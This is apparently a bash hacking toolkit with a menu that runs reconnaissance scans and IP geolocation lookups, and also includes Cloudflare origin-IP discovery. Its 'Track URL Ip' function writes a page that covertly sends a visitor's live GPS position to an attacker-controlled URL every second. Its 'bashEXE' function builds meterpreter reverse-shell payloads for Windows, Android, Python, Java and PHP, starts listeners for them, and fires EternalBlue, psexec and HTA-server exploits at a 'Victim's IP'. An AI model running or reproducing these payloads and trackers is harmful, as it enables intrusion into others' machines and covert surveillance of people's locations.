#!/bin/bash

banner(){

clear
printf "\e[0m\n"
printf "\e[1;33m      \e[0m\e[1;32m \e[0m\n"
printf "\e[1;33m      \e[0m\e[1;32m \e[0m\n"
printf "\e[1;33m    _              _     , _                            \e[0m\e[1;32m \e[0m\n"
printf "\e[1;33m    | |            | |   /|/ \                           \e[0m\e[1;32m \e[0m\n"
printf "\e[1;33m    | |   __,   ,  | |    |   |   _  _  _    __,    _    \e[0m\e[1;32m \e[0m\n"
printf "\e[1;33m    |/ \_/  |  / \_|/ \   |   |  / |/ |/ |  /  |  |/ \_  \e[0m\e[1;32m \e[0m\n"
printf "\e[1;33m     \_/ \_/|_/ \/ |   |_/|   |_/  |  |  |_/\_/|_/|__/   \e[0m\e[1;32m \e[0m\n"
printf "\e[1;33m                                                 /|      \e[0m\e[1;32m \e[0m\n"
printf "\e[1;33m                                                 \|     \e[0m\e[1;32m \e[0m\n"               
printf "\e[0m\n"
printf "\e[0m\e[1;33m    Created By \e[0m\e[1;31m(\e[0m\e[1;33m RAPOAT \e[0m\e[1;31m)\e[0m\n"


}

menu() {
printf "\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m01\e[0m\e[1;31m]\e[0m\e[1;33m Whole Scan\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m02\e[0m\e[1;31m]\e[0m\e[1;33m Track Ip\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m03\e[0m\e[1;31m]\e[0m\e[1;33m Track URL Ip\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m04\e[0m\e[1;31m]\e[0m\e[1;33m unFlare\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m05\e[0m\e[1;31m]\e[0m\e[1;33m bashEXE\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m00\e[0m\e[1;31m]\e[0m\e[1;33m Exit\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Select An Option \e[0m\e[1;96m: \e[0m\e[1;93m\en' option

if [[ $option == 1 || $option == 01 ]]; then
wholeScan
elif [[ $option == 2 || $option == 02 ]]; then
useripaddr
elif [[ $option == 3 || $option == 03 ]]; then
trackurl
elif [[ $option == 4 || $option == 04 ]]; then
unFlare
elif [[ $option == 5 || $option == 05 ]]; then
bashEXE
elif [[ $option == 6 || $option == 06 ]]; then
hosting
elif [[ $option == 0 || $option == 00 ]]; then
sleep 1
printf "\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

wholeScan(){
banner
printf "\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input IP Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' useripaddress
whois $useripaddress
	dig $useripaddress +trace ANY
	nmap --script vuln -A -sV -sT -O -p- $useripaddress --oN vuln.txt
        curl -ILk $useripaddress
        curl -Lk $useripaddress/robots.txt
        curl -sI $useripaddress | grep 200 && lynx -listonly -dump $useripaddress | awk '{print $2}' | sort -u | grep -v links: || curl -sI $useripaddress | grep Location | awk '{print $2}' | lynx -listonly -dump - | awk '{print $2}' | sort -u | grep -v links:
        curl -sILk $useripaddress | tee >(grep X-Frame-Options && echo -e "\033[32m\nClick Jacking Header is present\nYou can't clickjack this site!\n\033[1m" || echo -e "\033[31m\nX-Frame-Options-Header is missing!\nClickjacking is possible, this site is vulnerable to Clickjacking\n\033[1m");sleep .5
        awk -F"," '{print "IP: " $14 "\nStatus: " $1 "\nRegion: " $5 "\nCountry: " $2 "\nCity: " $6 "\nISP: " $11 "\nLat & Lon: " $8 " " $9 "\nZIP: " $7 "\nTimezone: " $10 "\nAS: " $13}' <<< `curl -s http://ip-api.com/csv/$useripaddress`
                mtr -4 -rwc 1 $useripaddress
sleep 5
printf "\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Return To Main Menu\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Exit\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m>>\e[0m\e[1;96m  \en' mainorexit1

if [[ $mainorexit1 == 1 || $mainorexit1 == 01 ]]; then
banner
menu
elif [[ $mainorexit1 == 2 || $mainorexit1 == 02 ]]; then
printf "\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}

useripaddr() {

banner
printf "\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input IP Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' useripaddress

ipaddripapico=$(curl -s "https://ipapi.co/$useripaddress/json" -L)
ipaddripapicom=$(curl -s "http://ip-api.com/json/$useripaddress" -L)
userip=$(echo $ipaddripapico | grep -Po '(?<="ip":)[^,]*' | tr -d '[]"')
usercity=$(echo $ipaddripapico | grep -Po '(?<="city":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
useregion=$(echo $ipaddripapico | grep -Po '(?<="region":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercountry=$(echo $ipaddripapico | grep -Po '(?<="country_name":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userlat=$(echo $ipaddripapicom | grep -Po '(?<="lat":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userlon=$(echo $ipaddripapicom | grep -Po '(?<="lon":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usertime=$(echo $ipaddripapicom | grep -Po '(?<="timezone":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userpostal=$(echo $ipaddripapicom | grep -Po '(?<="zip":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userisp=$(echo $ipaddripapico | grep -Po '(?<="org":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userasn=$(echo $ipaddripapico | grep -Po '(?<="asn":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercountrycode=$(echo $ipaddripapico | grep -Po '(?<="country_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercurrency=$(echo $ipaddripapico | grep -Po '(?<="currency":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userlanguage=$(echo $ipaddripapico | grep -Po '(?<="languages":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercalling=$(echo $ipaddripapico | grep -Po '(?<="country_calling_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')

banner
printf "\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Ip Address    \e[0m\e[1;96m:\e[0m\e[1;92m   $userip\e[0m\n"
printf "  \e[0m\e[1;93m  City          \e[0m\e[1;96m:\e[0m\e[1;92m   $usercity\e[0m\n"
printf "  \e[0m\e[1;93m  Region        \e[0m\e[1;96m:\e[0m\e[1;92m   $useregion\e[0m\n"
printf "  \e[0m\e[1;93m  Country       \e[0m\e[1;96m:\e[0m\e[1;92m   $usercountry\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Latitude      \e[0m\e[1;96m:\e[0m\e[1;92m    $userlat\e[0m\n"
printf "  \e[0m\e[1;93m  Longitude     \e[0m\e[1;96m:\e[0m\e[1;92m    $userlon\e[0m\n"
printf "  \e[0m\e[1;93m  Time Zone     \e[0m\e[1;96m:\e[0m\e[1;92m    $usertime\e[0m\n"
printf "  \e[0m\e[1;93m  Postal Code   \e[0m\e[1;96m:\e[0m\e[1;92m    $userpostal\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  ISP           \e[0m\e[1;96m:\e[0m\e[1;92m   $userisp\e[0m\n"
printf "  \e[0m\e[1;93m  ASN           \e[0m\e[1;96m:\e[0m\e[1;92m   $userasn\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Country Code  \e[0m\e[1;96m:\e[0m\e[1;92m   $usercountrycode\e[0m\n"
printf "  \e[0m\e[1;93m  Currency      \e[0m\e[1;96m:\e[0m\e[1;92m   $usercurrency\e[0m\n"
printf "  \e[0m\e[1;93m  Languages     \e[0m\e[1;96m:\e[0m\e[1;92m   $userlanguage\e[0m\n"
printf "  \e[0m\e[1;93m  Calling Code  \e[0m\e[1;96m:\e[0m\e[1;92m   $usercalling\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  GOOGLE Maps   \e[0m\e[1;96m:\e[0m\e[1;94m  https://maps.google.com/?q=$userlat,$userlon\e[0m\n"
sleep 5
printf "\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Return To Main Menu\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Exit\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m>>\e[0m\e[1;96m  \en' mainorexit2

if [[ $mainorexit2 == 1 || $mainorexit2 == 01 ]]; then
banner
menu
elif [[ $mainorexit2 == 2 || $mainorexit2 == 02 ]]; then
printf "\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}

trackurl() {
#!/bin/bash

#64_bit
#xterm -e ./ngrok http 80 & clear

#32_Bit
sudo service nginx stop
xterm -e sudo service apache2 restart
xterm -e ./ngrok http 80 & clear


echo "            ______________________________________________________   
            7      77  _  77  _  77     77  7  77  7  77  _  77  7   
            !__  __!|    _||  _  ||  ___!|   __!|  |  ||    _||  |   
              7  7  |  _ \ |  7  ||  7___|     ||  |  ||  _ \ |  !___
              |  |  |  7  ||  |  ||     7|  7  ||  !  ||  7  ||     7
              !__!  !__!__!!__!__!!_____!!__!__!!_____!!__!__!!_____!
                                                                     "
sleep 5
read -p '           URL: ' varurl
echo "<!DOCTYPE html>

<html>
    <head>
        <title>Z-HACKER</title>
        <style type=\"text/css\">
            
            body {
                background-image: url(\"rapoat.jpg\");
                background-size: 1000px 1600px;
                background-repeat: no-repeat;
                background: #000;
            }

        </style>
    </head>
    <body>

        <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js\" type='text/javascript' ></script>
        <script type='text/javascript'>
        function httpGet(theUrl)
        {
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( \"GET\", theUrl, false ); // false for synchronous request
            xmlHttp.send( null );
            return xmlHttp.responseText;
        }


        function autoUpdate() {
          navigator.geolocation.getCurrentPosition(function(position) {
            coords = position.coords.latitude + \",\" + position.coords.longitude;
             url = \""$varurl"/logme/\" + coords;
            httpGet(url);
            console.log('should be working');
            setTimeout(autoUpdate, 1000);
        })
        };
        \$(document).ready(function(){
           autoUpdate();
        });

        </script>
    </body>
</html>" > index.html

mv index.html /var/www/html/index.html
cp rapoat.jpg /var/www/html/rapoat.jpg
service apache2 start
echo "         ______________________________________________________   
         7      77  _  77  _  77     77  7  77  7  77  _  77  7   
         !__  __!|    _||  _  ||  ___!|   __!|  |  ||    _||  |   
           7  7  |  _ \ |  7  ||  7___|     ||  |  ||  _ \ |  !___
           |  |  |  7  ||  |  ||     7|  7  ||  !  ||  7  ||     7
           !__!  !__!__!!__!__!!_____!!__!__!!_____!!__!__!!_____!
                                                                  " > /var/log/apache2/access.log
xterm -e tail -f /var/log/apache2/access.log &
sleep 5
printf "\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Return To Main Menu\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Exit\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m>>\e[0m\e[1;96m  \en' mainorexit3

if [[ $mainorexit1 == 1 || $mainorexit1 == 01 ]]; then
banner
menu
elif [[ $mainorexit1 == 2 || $mainorexit1 == 02 ]]; then
printf "\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

unFlare(){
    #!/bin/bash
# CloudUnflare

CompleteDNS_Login='email@mail.com|password'

if [[ -z $(command -v dig) ]]; then
	echo " ERROR: \"dig\" command not found"
	exit
elif [[ -z $(command -v curl) ]]; then
	echo " ERROR: \"curl\" command not found"
	exit
elif [[ -z $(command -v whois) ]]; then
	echo " ERROR: \"whois\" command not found"
	exit
fi

echo '       __                          '
echo '    __(  )_       CLOUDFLARE       '
echo ' __(       )_   RECONNAISSANCE     '
echo '(____________)__ _  V 0.2          '
echo ' _   _ _ __  / _| | __ _ _ __ ___  '
echo '| | | | `_ \| |_| |/ _` | `__/ _ \ '
echo '| |_| | | | |  _| | (_| | | |  __/ '
echo ' \__,_|_| |_|_| |_|\__,_|_|  \___| '
echo ''

if [[ -f cuf-domain.tmp ]]; then
	rm cuf-domain.tmp
elif [[ -f cuf-ipaddr.tmp ]]; then
	rm cuf-ipaddr.tmp
fi

echo " Input domain name"
echo " Example: google.com"
echo -ne " >> "
read DOMAIN
echo ''

if [[ -z $(dig +short ${DOMAIN}) ]]; then
	if [[ -z $(whois ${DOMAIN} | grep -i 'Domain Name:') ]]; then
		echo " ERROR: Domain not found"
		exit
	fi
fi

function Dig() {
	D=$1
	echo " INFO: Checking ${D}"
	for DMN in $(dig +short ${D} | grep '[.]'$ | sed 's/[.]$//g' | sort -V | uniq)
	do
		echo "   + CNAME: ${DMN}"
	done
	for IP in $(dig +short ${D} | grep [0-9]$ | sort -V | uniq)
	do
		VENDOR=$(curl -s "https://rdap.arin.net/registry/ip/${IP}" -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 KHTML, like Gecko) Chrome/77.0.3865.120 Mobile Safari/537.36' --compressed | sed 's/",/\n/g' | grep '"name"' | sed 's/://g' | sed 's/"//g' | awk '{print $2}')
		echo "   + ${IP} [${VENDOR}]"
	done
}

Dig ${DOMAIN}

i=0
c=0
max=$(cat `dirname $(realpath $0)`/subdomains.txt | wc -l)
for SUBD in $(cat `dirname $(realpath $0)`/subdomains.txt)
do
	((i++))
	SUBDOMAIN=${SUBD}.${DOMAIN}
	if [[ ! -z $(dig +short ${SUBDOMAIN}) ]]; then
		Dig ${SUBDOMAIN}
	else
		((c++))
		if [[ $(expr $c % 20) -eq 0 ]]; then
			echo " INFO: Subdomain enumeration progress [${i}/${max}]"
		fi
	fi
done

function CompleteDNS() {
	DMN=${1}
	CRE=${2}
	EMAIL=$(echo ${CRE} | awk -F '|' '{print $1}')
	PASS=$(echo ${CRE} | awk -F '|' '{print $2}')
	TOKEN=$(curl -s --cookie-jar cookie.txt https://completedns.com/login | grep '_csrf_token' | sed 's/value="/\nToken /g' | grep ^Token | sed 's/"//g' | awk '{print $2}')
	if [[ ! -z $(curl -skL --cookie cookie.txt --cookie-jar cookie.txt 'https://completedns.com/login_check' --data "_csrf_token=${TOKEN}&_username=${EMAIL}&_password=${PASS}&submitButton=" | grep 'Invalid credentials.') ]]; then
		echo " ERROR: CompleteDNS cannot login"
		return 1
	fi
	if [[ -f completedns.tmp ]]; then
		rm completedns.tmp
	fi
	curl -s --cookie cookie.txt https://completedns.com/dns-history/ajax/?domain=${DMN} &>> completedns.tmp
	echo " INFO: NS History by CompleteDNS.com"
	i=0
	IFS=$'\n'
	for NSROW in $(cat completedns.tmp | sed ':a;N;$!ba;s/\n/ /g' | sed 's/clearfix/\n/g' | sed 's/col-md-2/\nASULAH/g' | grep ASULAH | sed 's/  //g' | sed 's/>/ /g' | sed 's/</ /g');
	do
		((i++))
		echo "${NSROW}" | awk '{print "   + "$11"/"$10"/"$5}'
		echo "${NSROW}" | sed 's/br \//\nNSLine /g' | grep -v '"' | grep -v '/' | awk '{print "       * "$2}'
	done
	if [[ ${i} -lt 1 ]]; then
		echo "   * Empty"
	fi
	if [[ -f completedns.tmp ]]; then
		rm completedns.tmp
	elif [[ -f cookie.txt ]]; then
		rm cookie.txt
	fi
}

CompleteDNS "${DOMAIN}" "${CompleteDNS_Login}"

function ViewDNS() {
	DMN="${1}"
	if [[ -f viewdns.tmp ]]; then
		rm viewdns.tmp
	fi
	curl -s "https://viewdns.info/iphistory/?domain=${DMN}" -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Mobile Safari/537.36' --compressed &>> viewdns.tmp
	COUNT=$(cat viewdns.tmp | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<table border="1">/\nIPHISTORY/g' | sed 's/<\/table>/\n/g' | grep ^IPHISTORY | sed 's/<tr><td>/\n/g' | sed 's/\r//' | grep ^[0-9] | sed 's/<\/td><td>/|/g' | sed 's/<\/td><td align="center">/|/g' | sed 's/<\/td><\/tr>//g' | awk -F '|' '{print "   + "$4" | "$1" | "$3"("$2")"}' | sort -V | wc -l);
	if [[ ${COUNT} -lt 1 ]]; then
		echo " ERROR: No IP History data in ViewDNS.info"
	else
		echo " INFO: IP History by ViewDNS.info"
		cat viewdns.tmp | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<table border="1">/\nIPHISTORY/g' | sed 's/<\/table>/\n/g' | grep ^IPHISTORY | sed 's/<tr><td>/\n/g' | sed 's/\r//' | grep ^[0-9] | sed 's/<\/td><td>/|/g' | sed 's/<\/td><td align="center">/|/g' | sed 's/<\/td><\/tr>//g' | awk -F '|' '{print "   + "$4" | "$1" | "$3"("$2")"}' | sort -V
	fi
	rm viewdns.tmp
}

ViewDNS ${DOMAIN}
sleep 5
printf "\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Return To Main Menu\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Exit\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m>>\e[0m\e[1;96m  \en' mainorexit4

if [[ $mainorexit2 == 1 || $mainorexit2 == 01 ]]; then
banner
menu
elif [[ $mainorexit2 == 2 || $mainorexit2 == 02 ]]; then
printf "\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}

bashEXE(){
#!/bin/bash
# test ver

# easysploit
sudo service nginx stop
xterm -e sudo service apache2 restart
xterm -e ./ngrok tcp 4400 & clear
ip=$(ip addr show wlan0 | awk '/inet / {print $2}' | cut -d/ -f 1)

 echo -e '\e[1;33m
 _              _      ___  _       ___ 
| |            | |    / (_)(_\  /  / (_)
| |   __,   ,  | |    \__     \/   \__  
|/ \_/  |  / \_|/ \   /       /\   /    
 \_/ \_/|_/ \/ |   |_/\___/ _/  \_/\___/  \e[1;34m
                                Created by "RAPOAT"
                                ngrok tcp 4400 forward recommended

\e[1;32m
(1) Windows --> test.exe (payload and listener) 
(2) Android --> test.apk (payload and listener)  
(3) Linux --> test.py (payload and listener) 
(4) MacOS --> test.jar (payload and listener)
(5) Web --> test.php (payload and listener)
(6) Scan if a target is vulnerable to ms17_010
(7) Exploit Windows 7/2008 x64 ONLY by IP (ms17_010_eternalblue)
(7rd) Enable Remote Desktop (ms17_010_eternalblue)
(8) Exploit Windows Vista/XP/2000/2003 ONLY by IP (ms17_010_psexec) 
(8rd) Enable Remote Desktop (ms17_010_psexec)
(9) Exploit Windows with a link (HTA Server)
(10) Contact with us - Our accounts
'
 
service postgresql start
exe='1'
apk='2'
py='3'
jar='4' 
php='5'
scan='6'
eternalblue='7'
eternalbluerd='7rd'
psexec='8'
psexecrd='8rd'
hta='9'
me='10'



read x

if [ "$x" == "$exe" ]; then                    #EXE
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input IP Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' ip
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input port Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' port
msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=$port -e x86/ shikata_ga_nai -i 50 -f exe > test.exe
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: test.exe!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost 127.0.0.1 ; set lport 4400 ; exploit -j ; jobs ;"


elif [ "$x" == "$apk" ]; then                          #APK
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input IP Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' ip
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input port Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' port
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$port > test.apk
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: test.apk!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost 127.0.0.1 ; set lport 4400 ; exploit -j ; jobs ; "




elif [ "$x" == "$py" ]; then                       #PYTHON
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input IP Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' ip
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input port Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' port
msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=$port > test.py
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: test.py!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost 127.0.0.1 ; set lport 4400 ; exploit -j ; jobs ; "



elif [ "$x" == "$jar" ]; then                        #JAVA
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input IP Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' ip
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input port Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' port
msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=$port -f jar > test.jar
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: test.jar!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost 127.0.0.1 ; set lport 4400 ; exploit -j ; jobs ; "






elif [ "$x" == "$php" ]; then                        #PHP
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input IP Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' ip
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input port Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' port
msfvenom -p php/meterpreter/reverse_tcp lhost=$ip lport=$port > test.php
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: test.php!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload php/meterpreter/reverse_tcp;  set lhost 127.0.0.1 ; set lport 4400 ; eexploit -j ; jobs ; "




elif [ "$x" == "$scan" ]; then                        #SCAN
echo "Victim's IP:"
read r

msfconsole -q -x " use auxiliary/scanner/smb/smb_ms17_010; set rhosts $r ; exploit ;exit ;"
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read


elif [ "$x" == "$eternalblue" ]; then                        #ETERNALBLUE
echo "Victim's IP:"
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp;  set lhost $ip ; set rhost $r ; exploit ; "



elif [ "$x" == "$eternalbluerd" ]; then                        #ETERNALBLUERD
echo "Victim's IP:"
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/vncinject/reverse_tcp;  set lhost $ip ; set rhost $r ; set viewonly false ; exploit ; "




elif [ "$x" == "$psexec" ]; then                        #PSEXEC
echo "Victim's IP:" 
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set lhost $ip ; set rhost $r ; exploit ;"


elif [ "$x" == "$psexecrd" ]; then                        #PSEXECRD
echo "Victim's IP:"
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set payload windows/vncinject/reverse_tcp;  set lhost $ip ; set rhost $r ; set viewonly false ; exploit ; "



elif [ "$x" == "$hta" ]; then                        #HTA
echo 'Uripath: (/)'
read u
msfconsole -q -x " use exploit/windows/misc/hta_server; set srvhost $ip; set uripath /$u; set payload windows/meterpreter/reverse_tcp; set lhost $ip ; exploit ;"



elif [ "$x" == "$me" ]; then                 #CONTACT WITH ME                      

clear

echo -e '\e[1;33m

 ,_    __,    _   __   __, _|_ 
/  |  /  |  |/ \_/  \_/  |  |  
   |_/\_/|_/|__/ \__/ \_/|_/|_/
           /|                  
           \| \e[0m


 \e[1;31m
 https://github.com/rap0at
 \e[1;34m



                          Press ENTER to Main Menu
'
read

else 

n


fi

}

hosting(){
	# ---- nginx ---- #
	# sudo apt install nginx -y
	sudo service apache2 stop
	sudo service nginx restart

	# ---- tor ---- #
	# sudo apt install tor -y
	sudo cp torrc /etc/tor/torrc
	sudo cp index.html /var/www/html/index.html
	sudo service tor restart
	cat /var/lib/tor/hidden_service/hostname & 
	xterm -e tail -f /var/log/nginx/access.log &
}

banner
menu
